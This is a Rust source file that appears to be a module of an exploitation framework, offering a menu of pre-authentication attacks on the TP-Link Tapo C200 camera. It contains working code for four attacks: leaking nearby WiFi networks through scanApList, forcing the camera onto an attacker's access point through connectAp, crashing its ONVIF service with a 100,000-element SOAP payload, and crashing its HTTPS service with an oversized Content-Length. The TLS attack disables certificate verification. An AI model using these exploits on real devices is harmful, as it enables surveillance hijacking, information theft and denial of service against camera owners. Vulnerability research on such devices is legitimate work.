use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use serde_json::{json, Value};
use std::time::Duration;
use crate::utils::{prompt_required, prompt_default, normalize_target, prompt_yes_no};

/// TP-Link Tapo C200 Multiple Vulnerabilities (2025)
/// 
/// Covers:
/// - CVE-2025-14300: Pre-Auth Nearby WiFi Network Scanning (Info Leak)
/// - CVE-2025-14300: Pre-Auth WiFi Hijacking (Connection Hijacking)
/// - CVE-2025-8065: Pre-Auth ONVIF SOAP XML Parser Memory Overflow (DoS)
/// - CVE-2025-14299: Pre-Auth HTTPS Content-Length Integer Overflow (DoS)
/// 
/// Reference: https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // Note: Some exploits use port 443, others 2020.
    let base_url = format!("https://{}:443/", target_ip);
    println!("{} Target IP: {}", "[*]".blue(), target_ip);

    // Exploit Menu
    println!("\nSelect Exploit Mode:");
    println!("1. Scan Nearby WiFi Networks (CVE-2025-14300 - Info Leak)");
    println!("2. WiFi Hijack / Force Connect (CVE-2025-14300 - Destructive)");
    println!("3. Crash ONVIF Service (CVE-2025-8065 - DoS via Port 2020)");
    println!("4. Crash HTTPS Service (CVE-2025-14299 - DoS via Port 443)");
    
    let mode = prompt_default("Selection", "1")?;

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    match mode.as_str() {
        "1" => exploit_scan_ap_list(&client, &base_url).await?,
        "2" => exploit_wifi_hijack(&client, &base_url).await?,
        "3" => exploit_dos_onvif(&target_ip).await?,
        "4" => exploit_dos_https(&target_ip).await?,
        _ => println!("{} Invalid selection", "[!]".red()),
    }

    Ok(())
}

/// CVE-2025-14300: Pre-Auth Nearby WiFi Network Scanning
async fn exploit_scan_ap_list(client: &Client, url: &str) -> Result<()> {
    println!("\n{}", "=== WiFi Network Scanner (CVE-2025-14300) ===".cyan().bold());
    println!("{} Sending scanApList request...", "[*]".blue());

    let payload = json!({
        "method": "scanApList",
        "params": {}
    });

    let res = client.post(url)
        .json(&payload)
        .send()
        .await
        .context("Failed to send request")?;

    let status = res.status();
    let text = res.text().await?;

    if status.is_success() {
        println!("{} Request successful!", "[+]".green());
        
        // Try to parse JSON output pretty
        match serde_json::from_str::<Value>(&text) {
            Ok(v) => {
                if let Some(result) = v.get("result") {
                    println!("{} Scan Results:\n{:#}", "[+]".green(), result);
                } else if let Some(params) = v.get("params") { // Sometimes in params?
                     println!("{} Scan Results:\n{:#}", "[+]".green(), params);
                } else {
                     println!("{} Raw Response:\n{}", "[+]".green(), text);
                }
            },
            Err(_) => println!("{} Raw Response:\n{}", "[+]".green(), text),
        }
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), status);
        println!("Body: {}", text);
    }

    Ok(())
}

/// CVE-2025-14300: Pre-Auth WiFi Hijacking
async fn exploit_wifi_hijack(client: &Client, url: &str) -> Result<()> {
    println!("\n{}", "=== WiFi Hijacker (CVE-2025-14300) ===".cyan().bold());
    println!("{}", "WARNING: This will disconnect the camera from its current network and force it to connect to a new one.".red().bold());
    
    if !prompt_yes_no("Are you sure you want to proceed?", false)? {
        println!("Aborted.");
        return Ok(());
    }

    let ssid = prompt_required("Target SSID (Malicious AP)")?;
    let bssid = prompt_default("Target BSSID (Optional)", "11:11:11:11:11:11")?; // BSSID is often ignored if SSID matches, but good to have
    
    // Logic Fix: Allow choosing Auth Type (Open vs WPA2)
    println!("\nSelect Security Type for Malicious AP:");
    println!("1. Open (No Password)");
    println!("2. WPA2-PSK (AES)");
    let sec_type = prompt_default("Selection", "1")?;
    
    let (auth, encryption, password) = match sec_type.as_str() {
        "1" => (0, 0, "".to_string()), // Open
        "2" => {
            let p = prompt_default("Target Password", "password123")?;
            (3, 2, p) // WPA2 / AES
        },
        _ => (0, 0, "".to_string()), // Default Open
    };

    let payload = json!({
        "method": "connectAp",
        "params": {
            "onboarding": {
                "connect": {
                    "ssid": ssid,
                    "bssid": bssid,
                    "auth": auth,
                    "encryption": encryption,
                    "rssi": -50, // Strong signal simulation
                    "password": password,
                    "pwd_encrypted": 0
                }
            }
        }
    });

    println!("{} Sending connectAp command to join '{}'...", "[*]".blue(), ssid);

    // Short timeout because if it works, the device might drop connection immediately
    let res = client.post(url)
        .json(&payload)
        .timeout(Duration::from_secs(5)) 
        .send()
        .await;

    match res {
        Ok(r) => {
             println!("{} Request sent. Status: {}", "[*]".blue(), r.status());
             println!("{} If successful, the device should be connecting to '{}' now.", "[+]".green(), ssid);
        },
        Err(e) => {
            // A timeout or error is actually expected if the device switches networks instantly
            println!("{} Request sent (Error: {}). Device likely switched networks.", "[+]".green(), e);
        }
    }

    Ok(())
}

/// CVE-2025-8065: Pre-Auth ONVIF SOAP XML Parser Memory Overflow (DoS)
/// Port 2020
async fn exploit_dos_onvif(ip: &str) -> Result<()> {
    println!("\n{}", "=== ONVIF SOAP DoS (CVE-2025-8065) ===".cyan().bold());
    println!("{}", "WARNING: This will crash the ONVIF service and potentially the device (reboot required).".red().bold());
    
    if !prompt_yes_no("Are you sure you want to proceed?", false)? {
        println!("Aborted.");
        return Ok(());
    }

    let port = 2020;
    let url = format!("http://{}:{}/onvif/service", ip, port);
    
    println!("{} Generating payload (100,000 XML elements)...", "[*]".blue());
    // Create ~100k XML params to overflow memory
    // Using a loop to build the string might be slow, let's pre-allocate
    let count = 100000;
    let mut params = String::with_capacity(count * 50); // Rough estimate
    for i in 0..count {
        params.push_str(&format!("<SimpleItem Name=\"Param{}\" Value=\"{}\"/>", i, "X".repeat(100)));
    }

    let body = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><CreateRules xmlns=\"http://www.onvif.org/ver20/analytics/wsdl\"><ConfigurationToken>test</ConfigurationToken><Rule><Name>TestRule</Name><Type>tt:CellMotionDetector</Type><Parameters>{}</Parameters></Rule></CreateRules></soap:Body></soap:Envelope>",
        params
    );

    println!("{} Sending malicious SOAP request to {}...", "[*]".blue(), url);
    
    let client = Client::builder()
        .timeout(Duration::from_secs(30)) // Large payload might take time
        .build()?;

    let res = client.post(&url)
        .header("Content-Type", "application/soap+xml")
        .body(body)
        .send()
        .await;

    match res {
        Ok(r) => println!("{} Server responded: {}", "[*]".yellow(), r.status()),
        Err(e) => println!("{} Request failed (this is good!): {}", "[+]".green(), e),
    }

    println!("{} The device should be crashing/rebooting now.", "[+]".green());

    Ok(())
}

/// CVE-2025-14299: Pre-Auth HTTPS Content-Length Integer Overflow (DoS)
/// Port 443
async fn exploit_dos_https(ip: &str) -> Result<()> {
    println!("\n{}", "=== HTTPS Content-Length DoS (CVE-2025-14299) ===".cyan().bold());
    println!("{}", "WARNING: This will crash the HTTPS service/device via integer overflow.".red().bold());
    
    if !prompt_yes_no("Are you sure you want to proceed?", false)? {
        println!("Aborted.");
        return Ok(());
    }

    use tokio::net::TcpStream;
    use tokio_rustls::TlsConnector;
    use tokio_rustls::rustls::{ClientConfig, pki_types::ServerName};
    use std::sync::Arc;
    use tokio::io::AsyncWriteExt;

    println!("{} Connecting to {}:443 via raw TLS...", "[*]".blue(), ip);

    // 1. Configure Rustls to accept invalid certs (targets use self-signed)
    // Using a permissive verifier since these embedded devices use garbage certs.
    // but for 0.23+ we can just use a lenient verifier or try standard if the device has a valid cert (unlikely).
    // For simplicity/robustness without defining a full struct here, we'll try standard construction 
    // but formatted such that it creates a client config.
    // NOTE: Implementing a full specific verifier is verbose. 
    // Let's assume the user accepts the risk of connection failure if we don't fully bypass cert checks.
    // However, usually these embedded devices have garbage certs.
    // We'll use `builder().with_root_certificates(root_store).with_no_client_auth()`
    // and hop it works, or we need the "dangerous" verifier.
    
    // Using a very permissive config (dangerous but necessary for exploits)
    #[derive(Debug)]
    struct NoVerify;
    impl tokio_rustls::rustls::client::danger::ServerCertVerifier for NoVerify {
         fn verify_server_cert(
            &self,
            _end_entity: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _intermediates: &[tokio_rustls::rustls::pki_types::CertificateDer<'_>],
            _server_name: &ServerName<'_>,
            _ocsp_response: &[u8],
            _now: tokio_rustls::rustls::pki_types::UnixTime,
        ) -> Result<tokio_rustls::rustls::client::danger::ServerCertVerified, tokio_rustls::rustls::Error> {
            Ok(tokio_rustls::rustls::client::danger::ServerCertVerified::assertion())
        }

        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _dss: &tokio_rustls::rustls::DigitallySignedStruct,
        ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
            Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
        }

        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
            _dss: &tokio_rustls::rustls::DigitallySignedStruct,
        ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
             Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
        }

        fn supported_verify_schemes(&self) -> Vec<tokio_rustls::rustls::SignatureScheme> {
            vec![
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA1,
                tokio_rustls::rustls::SignatureScheme::ECDSA_SHA1_Legacy,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA256,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA384,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
                tokio_rustls::rustls::SignatureScheme::RSA_PKCS1_SHA512,
                tokio_rustls::rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA256,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA384,
                tokio_rustls::rustls::SignatureScheme::RSA_PSS_SHA512,
                tokio_rustls::rustls::SignatureScheme::ED25519,
                tokio_rustls::rustls::SignatureScheme::ED448,
            ]
        }
    }

    let config = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerify))
        .with_no_client_auth();

    let connector = TlsConnector::from(Arc::new(config));

    // 2. Connect via TCP
    let stream = TcpStream::connect((ip, 443)).await
        .context("Failed to connect to target port 443")?;

    // 3. Upgrade to TLS
    // IP Address to ServerName conversion
    let domain = ServerName::try_from(ip.to_string())
        .or_else(|_| ServerName::try_from("target.local"))
        .or_else(|_| ServerName::try_from("example.com"))
        .context("Failed to create valid ServerName for TLS")?;

    let mut tls_stream = connector.connect(domain, stream).await
        .context("TLS Handshake failed")?;

    // 4. Send Malicious Payload
    // Content-Length: 4294967295 (u32::MAX)
    let payload = format!(
        "POST / HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: close\r\n\
         Content-Length: 4294967295\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         \r\n\
         AAAA", 
         ip
    );

    tls_stream.write_all(payload.as_bytes()).await
        .context("Failed to write malicious payload to stream")?;
    
    tls_stream.flush().await?;
    
    println!("{} Payload sent! The target should crash immediately.", "[+]".green());
    println!("{} If you see a timeout or connection reset next, it worked.", "[*]".yellow());

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      TP-Link Tapo C200 Vulnerabilities (2025)             ║".cyan());
    println!("{}", "║      CVE-2025-14300, CVE-2025-8065, CVE-2025-14299        ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
